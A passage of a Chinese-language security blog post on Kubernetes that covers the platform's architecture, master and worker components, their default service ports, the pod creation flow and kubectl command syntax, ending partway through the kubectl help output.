<!DOCTYPE HTML>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="云原生安全-Kubernetes Security, Qftm">
    <meta name="description" content="Maybe a hacker">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>云原生安全-Kubernetes Security | Qftm</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Qftm</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-heartbeat" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Qftm</div>
        <div class="logo-desc">
            
            Maybe a hacker
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-heartbeat"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/banner/bg.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">云原生安全-Kubernetes Security</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        height: calc(100vh - 250px);
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Cloud/">
                                <span class="chip bg-color">Cloud</span>
                            </a>
                        
                            <a href="/tags/Kubernetes/">
                                <span class="chip bg-color">Kubernetes</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/" class="post-category">
                                云安全
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2021-08-15
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
                    2022-03-18
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
                    17.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
                    89 Min
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="Kubernetes-Learning"><a href="#Kubernetes-Learning" class="headerlink" title="Kubernetes Learning"></a>Kubernetes Learning</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
<p>Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。</p>
<p>Kubernetes 这个名字源于希腊语，意为”舵手”或”飞行员”。k8s 这个缩写是因为 k 和 s 之间有八个字符的关系。Google 在 2014 年开源了 Kubernetes 项目。Kubernetes 建立在Google 在大规模运行生产工作负载方面拥有十几年的经验的基础上，结合了社区中最好的想法和实践。</p>
</blockquote>
<p>Kubernetes 是谷歌开源的容器集群管理系统，是 Google 多年大规模容器管理技术 Borg 的开源版本，主要功能包括：</p>
<ul>
<li><p><strong>服务发现和负载均衡</strong></p>
<p>Kubernetes 可以使用 DNS 名称或自己的 IP 地址公开容器，如果进入容器的流量很大， Kubernetes 可以负载均衡并分配网络流量，从而使部署稳定。</p>
</li>
<li><p><strong>存储编排</strong></p>
<p>Kubernetes 允许你自动挂载你选择的存储系统，例如本地存储、公共云提供商等。</p>
</li>
<li><p><strong>自动部署和回滚</strong></p>
<p>你可以使用 Kubernetes 描述已部署容器的所需状态，它可以以受控的速率将实际状态 更改为期望状态。例如，你可以自动化 Kubernetes 来为你的部署创建新容器， 删除现有容器并将它们的所有资源用于新容器。</p>
</li>
<li><p><strong>自动完成装箱计算</strong></p>
<p>Kubernetes 允许你指定每个容器所需 CPU 和内存（RAM）。 当容器指定了资源请求时，Kubernetes 可以做出更好的决策来管理容器的资源。</p>
</li>
<li><p><strong>自我修复</strong></p>
<p>Kubernetes 重新启动失败的容器、替换容器、杀死不响应用户定义的 运行状况检查的容器，并且在准备好服务之前不将其通告给客户端。</p>
</li>
<li><p><strong>密钥与配置管理</strong></p>
<p>Kubernetes 允许你存储和管理敏感信息，例如密码、OAuth 令牌和 ssh 密钥。 你可以在不重建容器镜像的情况下部署和更新密钥和应用程序配置，也无需在堆栈配置中暴露密钥。</p>
</li>
</ul>
<p>Kubernetes 不是传统的、包罗万象的 PaaS（平台即服务）系统。 由于 Kubernetes 在容器级别而不是在硬件级别运行，它提供了 PaaS 产品共有的一些普遍适用的功能， 例如部署、扩展、负载均衡、日志记录和监视。 但是，Kubernetes 不是单体系统，默认解决方案都是可选和可插拔的。 Kubernetes 提供了构建开发人员平台的基础，但是在重要的地方保留了用户的选择和灵活性：</p>
<ul>
<li><p>不限制支持的应用程序类型。 Kubernetes 旨在支持极其多种多样的工作负载，包括无状态、有状态和数据处理工作负载。 如果应用程序可以在容器中运行，那么它应该可以在 Kubernetes 上很好地运行。</p>
</li>
<li><p>不部署源代码，也不构建你的应用程序。 持续集成(CI)、交付和部署（CI/CD）工作流取决于组织的文化和偏好以及技术要求。</p>
</li>
<li><p>不提供应用程序级别的服务作为内置服务，例如中间件（例如，消息中间件）、 数据处理框架（例如，Spark）、数据库（例如，mysql）、缓存、集群存储系统 （例如，Ceph）。这样的组件可以在 Kubernetes 上运行，并且/或者可以由运行在 Kubernetes 上的应用程序通过可移植机制（例如， <a href="https://openservicebrokerapi.org/" target="_blank" rel="noopener">开放服务代理</a>）来访问。</p>
</li>
<li><p>不要求日志记录、监视或警报解决方案。 它提供了一些集成作为概念证明，并提供了收集和导出指标的机制。</p>
</li>
<li><p>不提供或不要求配置语言/系统（例如 jsonnet），它提供了声明性 API， 该声明性 API 可以由任意形式的声明性规范所构成。</p>
</li>
<li><p>不提供也不采用任何全面的机器配置、维护、管理或自我修复系统。</p>
</li>
<li><p>此外，Kubernetes 不仅仅是一个编排系统，实际上它消除了编排的需要。 编排的技术定义是执行已定义的工作流程：首先执行 A，然后执行 B，再执行 C。 相比之下，Kubernetes 包含一组独立的、可组合的控制过程， 这些过程连续地将当前状态驱动到所提供的所需状态。 如何从 A 到 C 的方式无关紧要，也不需要集中控制，这使得系统更易于使用 且功能更强大、系统更健壮、更为弹性和可扩展。</p>
</li>
</ul>
<h2 id="Core-Architecture"><a href="#Core-Architecture" class="headerlink" title="Core Architecture"></a>Core Architecture</h2><p>Kubernetes 借鉴了 Borg 的设计理念，比如 Pod、Service、Labels 和单 Pod 单 IP 等。Kubernetes 的整体架构跟 Borg 非常像，如下图所示</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211201163133559-16473541254911.png" alt="image-20211201163133559"></p>
<h2 id="Core-Components"><a href="#Core-Components" class="headerlink" title="Core Components"></a>Core Components</h2><p>Kubernetes 集群核心组件服务架构，如下图所示 </p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211202112432804-16473541254912.png" alt="image-20211202112432804"></p>
<h3 id="Master-Node"><a href="#Master-Node" class="headerlink" title="Master Node"></a>Master Node</h3><p>Master节点负责管理集群、协调集群中的所有活动，例如调度应用程序，维护应用程序的状态，扩展和更新应用程序等。</p>
<h4 id="Components"><a href="#Components" class="headerlink" title="Components"></a>Components</h4><p>（1）Kube-apiserver </p>
<p>kube-apiserver 是 Kubernetes 最重要的核心组件之一，主要提供以下的功能</p>
<ul>
<li>提供集群管理的 REST API 接口，包括认证授权、数据校验以及集群状态变更等</li>
<li>提供其他模块之间的数据交互和通信的枢纽（其他模块通过 API Server 查询或修改数据，只有 API Server 才直接操作 etcd）</li>
</ul>
<p>kube-apiserver 支持同时提供 https（默认监听在 6443 端口）和 http API（默认监听在 8080 端口），其中 http API 是非安全接口，不做任何认证授权机制，不建议生产环境启用。两个接口提供的 REST API 格式相同。</p>
<p>有多种方式可以访问 Kubernetes 提供的 REST API：</p>
<ul>
<li>kubectl 命令行工具</li>
<li>SDK，支持多种语言<ul>
<li><a href="https://github.com/kubernetes/client-go" target="_blank" rel="noopener">Go</a></li>
<li><a href="https://github.com/kubernetes-incubator/client-python" target="_blank" rel="noopener">Python</a></li>
<li><a href="https://github.com/kubernetes-client/javascript" target="_blank" rel="noopener">Javascript</a></li>
<li><a href="https://github.com/kubernetes-client/java" target="_blank" rel="noopener">Java</a></li>
<li><a href="https://github.com/kubernetes-client/csharp" target="_blank" rel="noopener">CSharp</a></li>
<li>其他 <a href="https://www.openapis.org/" target="_blank" rel="noopener">OpenAPI</a> 支持的语言，可以通过 <a href="https://github.com/kubernetes-client/gen" target="_blank" rel="noopener">gen</a> 工具生成相应的 client</li>
</ul>
</li>
</ul>
<p>（2）Etcd</p>
<p><a href="https://etcd.io/docs/" target="_blank" rel="noopener">Etcd</a> 是 CoreOS 基于 Raft 开发的分布式、一致性和高可用性的键值数据库，可以作为保存 Kubernetes 所有集群数据的后台数据库，使得集群可用于服务发现、共享配置以及一致性保障等。</p>
<p>Etcd 默认使用2379端口提供HTTP API服务，2380端口和peer通信(这两个端口已经被IANA官方预留给etcd)。</p>
<p>常见并使用广泛的一致性分布式键值存储有：Etcd、Zookeeper、Consul等。</p>
<p>（3）Kube-scheduler</p>
<p>kube-scheduler 负责分配调度 Pod 到集群内的节点上，它监听 kube-apiserver，查询还未分配 Node 的 Pod，然后根据调度策略为这些 Pod 分配节点（更新 Pod 的 <code>NodeName</code> 字段）。</p>
<p>调度器需要充分考虑诸多的因素：</p>
<ul>
<li>公平调度</li>
<li>资源高效利用</li>
<li>QoS</li>
<li>affinity 和 anti-affinity</li>
<li>数据本地化（data locality）</li>
<li>内部负载干扰（inter-workload interference）</li>
<li>deadlines</li>
</ul>
<p>对于指定Node节点调度，有三种方式可以指定 Pod 只运行在指定的 Node 节点上</p>
<ul>
<li>nodeSelector：只调度到匹配指定 label 的 Node 上</li>
<li>nodeAffinity：功能更丰富的 Node 选择器，比如支持集合操作</li>
<li>podAffinity：调度到满足条件的 Pod 所在的 Node 上</li>
</ul>
<p>（4）Controller Manager</p>
<p>Controller Manager 由 kube-controller-manager 和 cloud-controller-manager 组成，是 Kubernetes 的大脑，它通过 apiserver 监控整个集群的状态，并确保集群处于预期的工作状态。</p>
<p>kube-controller-manager 由一系列的控制器组成，如：</p>
<ul>
<li>Replication Controller</li>
<li>Node Controller</li>
<li>CronJob Controller</li>
<li>Daemon Controller</li>
<li>Deployment Controller</li>
<li>Endpoint Controller</li>
<li>Garbage Collector</li>
<li>Namespace Controller</li>
<li>Job Controller</li>
<li>Pod AutoScaler</li>
<li>RelicaSet</li>
<li>Service Controller</li>
<li>ServiceAccount Controller</li>
<li>StatefulSet Controller</li>
<li>Volume Controller</li>
<li>Resource quota Controller</li>
</ul>
<p>cloud-controller-manager 在 Kubernetes 启用 Cloud Provider 的时候才需要，用来配合云服务提供商的控制，也包括一系列的控制器，如：</p>
<ul>
<li>节点控制器（Node Controller）: 用于在节点终止响应后检查云提供商以确定节点是否已被删除</li>
<li>路由控制器（Route Controller）: 用于在底层云基础架构中设置路由</li>
<li>服务控制器（Service Controller）: 用于创建、更新和删除云提供商负载均衡器</li>
</ul>
<p>Controller manager metrics 提供了控制器内部逻辑的性能度量，如 Go 语言运行时度量、etcd 请求延时、云服务商 API 请求延时、云存储请求延时等。Controller manager metrics 默认监听在 <code>kube-controller-manager</code> 的 10252 端口，提供 Prometheus 格式的性能度量数据，可以通过 <code>http://localhost:10252/metrics</code> 来访问。</p>
<h4 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h4><table>
<thead>
<tr>
<th>Protocol</th>
<th>Port</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>TCP</td>
<td>6443</td>
<td>Kubernetes API server</td>
</tr>
<tr>
<td>TCP</td>
<td>8080</td>
<td>Kubernetes API insecure server</td>
</tr>
<tr>
<td>TCP</td>
<td>2379</td>
<td>Etcd server client API</td>
</tr>
<tr>
<td>TCP</td>
<td>2380</td>
<td>Etcd server peer communication</td>
</tr>
<tr>
<td>TCP</td>
<td>10251</td>
<td>kube-scheduler</td>
</tr>
<tr>
<td>TCP</td>
<td>10252</td>
<td>kube-controller-manager</td>
</tr>
<tr>
<td>TCP</td>
<td>10253</td>
<td>Cloud-controller-manager</td>
</tr>
</tbody></table>
<h3 id="Worker-Node"><a href="#Worker-Node" class="headerlink" title="Worker Node"></a>Worker Node</h3><p>Worker节点是VM(虚拟机)或物理计算机，充当k8s集群中的工作计算机。每个Worker节点都有一个Kubelet，它管理该Worker节点并负责与Master节点通信。同时，该Worker节点还具有用于处理容器操作的工具，例如Docker。</p>
<h4 id="Components-1"><a href="#Components-1" class="headerlink" title="Components"></a>Components</h4><p>（1）Kubelet</p>
<p>每个Worker Node节点上都运行一个 Kubelet 服务进程，默认监听 10250 端口，接收并执行 Master 发来的指令，管理 Pod 及 Pod 中的容器。每个 Kubelet 进程会在 API Server 上注册所在Node节点的信息，定期向 Master 节点汇报该节点的资源使用情况，并通过 cAdvisor 监控节点和容器的资源。</p>
<p>节点管理主要是节点自注册和节点状态更新：</p>
<ul>
<li>Kubelet 可以通过设置启动参数 –register-node 来确定是否向 API Server 注册自己；</li>
<li>如果 Kubelet 没有选择自注册模式，则需要用户自己配置 Node 资源信息，同时需要告知 Kubelet 集群上的 API Server 的位置；</li>
<li>Kubelet 在启动时通过 API Server 注册节点信息，并定时向 API Server 发送节点新消息，API Server 在接收到新消息后，将信息写入 etcd</li>
</ul>
<p>Kubelet 以 PodSpec 的方式工作。PodSpec 是描述一个 Pod 的 YAML 或 JSON 对象。 kubelet 采用一组通过各种机制提供的 PodSpecs（主要通过 apiserver），并确保这些 PodSpecs 中描述的 Pod 正常健康运行。</p>
<p>cAdvisor 是一个开源的分析容器资源使用率和性能特性的代理工具，集成到 Kubelet中，当Kubelet启动时会同时启动cAdvisor，且一个cAdvisor只监控一个Node节点的信息。cAdvisor 自动查找所有在其所在节点上的容器，自动采集 CPU、内存、文件系统和网络使用的统计信息。cAdvisor 通过其所在节点机的 4194 端口暴露一个简单的 UI。</p>
<p>容器运行时（Container Runtime）是 Kubernetes 最重要的组件之一，负责真正管理镜像和容器的生命周期。Kubelet 通过 容器运行时接口（Container Runtime Interface，CRI)与容器运行时交互，以管理镜像和容器。</p>
<p>Kubelet 作为 CRI 的客户端，而容器运行时则需要实现 CRI 的服务端（即 gRPC server，通常称为 CRI shim）。容器运行时在启动 gRPC server 时需要监听在本地的 Unix Socket （Windows 使用 tcp 格式）。</p>
<p>如下 kubelet 内部组件结构图所示，Kubelet 由许多内部组件构成</p>
<ul>
<li>Kubelet API，包括 10250 端口的认证 API、4194 端口的 cAdvisor API、10255 端口的只读 API 以及 10248 端口的健康检查 API</li>
<li>syncLoop：从 API 或者 manifest 目录接收 Pod 更新，发送到 podWorkers 处理，大量使用 channel 处理来处理异步请求</li>
<li>辅助的 manager，如 cAdvisor、PLEG、Volume Manager 等，处理 syncLoop 以外的其他工作</li>
<li>CRI：容器执行引擎接口，负责与 container runtime shim 通信</li>
<li>容器执行引擎，如 dockershim、rkt 等（注：rkt 暂未完成 CRI 的迁移）</li>
<li>网络插件，目前支持 CNI 和 kubenet</li>
</ul>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211203152012989-16473541254923.png" alt="image-20211203152012989"></p>
<p>（2）Kube-proxy</p>
<p>每台Worker机器上都运行一个 kube-proxy 服务，它监听 API server 中 service 和 endpoint 的变化情况，并通过userspace、iptables、ipvs 或 winuserspace 等 proxier 来为服务配置负载均衡（仅支持 TCP 和 UDP）。</p>
<p>kube-proxy 可以直接运行在物理机上，也可以以 static pod 或者 daemonset 的方式运行。</p>
<p>kube-proxy 当前支持以下几种实现</p>
<ul>
<li>userspace：最早的负载均衡方案，它在用户空间监听一个端口，所有服务通过 iptables 转发到这个端口，然后在其内部负载均衡到实际的 Pod。该方式最主要的问题是效率低，有明显的性能瓶颈。</li>
<li>iptables：目前推荐的方案，完全以 iptables 规则的方式来实现 service 负载均衡。该方式最主要的问题是在服务多的时候产生太多的 iptables 规则，非增量式更新会引入一定的时延，大规模情况下有明显的性能问题</li>
<li>ipvs：为解决 iptables 模式的性能问题，v1.11 新增了 ipvs 模式（v1.8 开始支持测试版，并在 v1.11 GA），采用增量式更新，并可以保证 service 更新期间连接保持不断开</li>
<li>winuserspace：同 userspace，但仅工作在 windows 节点上</li>
</ul>
<h4 id="Services-1"><a href="#Services-1" class="headerlink" title="Services"></a>Services</h4><table>
<thead>
<tr>
<th>Protocol</th>
<th>Port</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>TCP</td>
<td>4194</td>
<td>Kubelet cAdvisor (Container metrics)</td>
</tr>
<tr>
<td>TCP</td>
<td>10248</td>
<td>Kubelet healthz</td>
</tr>
<tr>
<td>TCP</td>
<td>10249</td>
<td>kube-proxy metrics</td>
</tr>
<tr>
<td>TCP</td>
<td>10250</td>
<td>Kubelet API</td>
</tr>
<tr>
<td>TCP</td>
<td>10255</td>
<td>Read-only Kubelet API</td>
</tr>
<tr>
<td>TCP</td>
<td>10256</td>
<td>kube-proxy</td>
</tr>
</tbody></table>
<h3 id="Service-Communication"><a href="#Service-Communication" class="headerlink" title="Service Communication"></a>Service Communication</h3><p>Kubernetes 集群多组件服务之间的通信原理，以典型的 Pod 创建流程为例，如下图所示</p>
<p><img src="/2021/08/15/Kubernetes-Security/image-20211202182811913-16473541254924.png" alt="image-20211202182811913"></p>
<pre><code>1、用户通过 REST API 创建一个 Pod （kubectl、dashboard 等可操作 REST API）
2、API Server 将其写入 etcd（API Server 负责 etcd 存储的所有操作，且只有 API Server 才可直接操作 etcd 集群）
3、Scheduluer 检测到未绑定 Node 的 Pod，开始调度并更新 Pod 的 Node 绑定
4、Kubelet 检测到有新的 Pod 调度过来，通过 Container Runtime 运行该 Pod
5、Kubelet 通过 Container Runtime 取到 Pod 状态，并更新到 API Server 中</code></pre><h2 id="Management-Tools"><a href="#Management-Tools" class="headerlink" title="Management Tools"></a>Management Tools</h2><h3 id="kubectl"><a href="#kubectl" class="headerlink" title="kubectl"></a>kubectl</h3><p>kubectl 是 Kubernetes 的命令行工具（CLI），是 Kubernetes 用户管理集群的必备工具。</p>
<blockquote>
<p>The Kubernetes command-line tool, <a href="https://kubernetes.io/docs/reference/kubectl/kubectl/" target="_blank" rel="noopener">kubectl</a>, allows you to run commands against Kubernetes clusters. You can use kubectl to deploy applications, inspect and manage cluster resources, and view logs. For more information including a complete list of kubectl operations, see the <a href="https://kubernetes.io/docs/reference/kubectl/" target="_blank" rel="noopener"><code>kubectl</code> reference documentation</a>.</p>
<p>kubectl is installable on a variety of Linux platforms, macOS and Windows. Find your preferred operating system below.</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux" target="_blank" rel="noopener">Install kubectl on Linux</a></li>
<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-macos" target="_blank" rel="noopener">Install kubectl on macOS</a></li>
<li><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-windows" target="_blank" rel="noopener">Install kubectl on Windows</a></li>
</ul>
<p>Github：<a href="https://github.com/kubernetes/kubectl" target="_blank" rel="noopener">https://github.com/kubernetes/kubectl</a></p>
</blockquote>
<h4 id="help"><a href="#help" class="headerlink" title="help"></a>help</h4><p><code>kubectl</code> 命令行的语法如下：</p>
<pre class="line-numbers language-bash"><code class="language-bash">kubectl <span class="token punctuation">[</span>command<span class="token punctuation">]</span> <span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>其中，<code>command</code>、<code>type</code>、<code>name</code>、<code>options</code> 的含义如下</p>
<blockquote>
<p>command：子命令，用于操作Kubernetes集群资源对象的命令，例如 create、delete、describe、get、apply 等</p>
<p>type：资源对象的类型，区分大小写，能以单数形式、复数形式或者简写形式表示。例如以下3种type是等价的</p>
<pre class="line-numbers language-bash"><code class="language-bash">kubectl get pod pod1
kubectl get pods pod1
kubectl get po pod1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>name：资源对象的名称，区分大小写。如果不指定名称，则系统将返回属于type的全部对象的列表，例如<code>kubectl get pods</code>将返回默认命名空间为default下的 Pod 列表</p>
<p>options：kubectl子命令的可选参数，例如使用<code>-s</code>指定api server的URL地址而不用默认值</p>
</blockquote>
<p><code>kubectl</code> 子命令</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span>: kubectl -h
kubectl controls the Kubernetes cluster manager.

 Find <span class="token function">more</span> information at: https://kubernetes.io/docs/reference/kubectl/overview/

Basic Commands <span class="token punctuation">(</span>Beginner<span class="token punctuation">)</span>:
  create        Create a resource from a <span class="token function">file</span> or from stdin.
  expose        使用 replication controller, service, deployment 或者 pod 并暴露它作为一个新的 Kubernetes Service
  run           在集群中运行一个指定的镜像
  <span class="token keyword">set</span>           为 objects 设置一个指定的特征

Basic Commands <span class="token punctuation">(</span>Intermediate<span class="token punctuation">)</span>:
  explain       查看资源的文档
  get           显示一个或更多 resources
  edit          在服务器上编辑一个资源
  delete        Delete resources by filenames, stdin, resources and names, or by resources and label selector

Deploy Commands:
  rollout       Manage the rollout of a resource
  scale         Set a new size <span class="token keyword">for</span> a Deployment, ReplicaSet or Replication Controller
  autoscale     自动调整一个 Deployment, ReplicaSet, 或者 ReplicationController 的副本数量

Cluster Management Commands:
  certificate   修改 certificate 资源.
  cluster-info  显示集群信息
  <span class="token function">top</span>           Display Resource <span class="token punctuation">(</span>CPU/Memory/Storage<span class="token punctuation">)</span> usage.
  cordon        标记 node 为 unschedulable
  uncordon      标记 node 为 schedulable
  drain         Drain node <span class="token keyword">in</span> preparation <span class="token keyword">for</span> maintenance
  taint         更新一个或者多个 node 上的 taints

Troubleshooting and Debugging Commands:
  describe      显示一个指定 resource 或者 group 的 resources 详情
  logs          输出容器在 pod 中的日志
  attach        Attach 到一个运行中的 container
  <span class="token function">exec</span>          在一个 container 中执行一个命令
  port-forward  Forward one or <span class="token function">more</span> local ports to a pod
  proxy         运行一个 proxy 到 Kubernetes API server
  <span class="token function">cp</span>            复制 files 和 directories 到 containers 和从容器中复制 files 和 directories.
  auth          Inspect authorization

Advanced Commands:
  <span class="token function">diff</span>          Diff live version against would-be applied version
  apply         通过文件名或标准输入流<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span>对资源进行配置
  patch         使用 strategic merge patch 更新一个资源的 field<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
  replace       通过 filename 或者 stdin替换一个资源
  <span class="token function">wait</span>          Experimental: Wait <span class="token keyword">for</span> a specific condition on one or many resources.
  convert       在不同的 API versions 转换配置文件
  kustomize     Build a kustomization target from a directory or a remote url.

Settings Commands:
  label         更新在这个资源上的 labels
  annotate      更新一个资源的注解
  completion    Output shell completion code <span class="token keyword">for</span> the specified shell <span class="token punctuation">(</span>bash or zsh<span class="token punctuation">)</span>

Other Commands:
  alpha         Commands <span class="token keyword">for</span> features <span class="token keyword">in</span> alpha
  api-resources Print the supported API resources on the server
  api-versions  Print the supported API versions on the server, <span class="token keyword">in</span> the form of <span class="token string">"group/version"</span>
  config        修改 kubeconfig 文件
  plugin        Provides utilities <span class="token keyword">for</span> interacting with plugins.
  version       输出 client 和 server 的版本信息

Usage:
  kubectl <span class="token punctuation">[</span>flags<span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>

Use <span class="token string">"kubectl &lt;command> --help"</span> <span class="token keyword">for</span> <span class="token function">more</span> information about a given command.
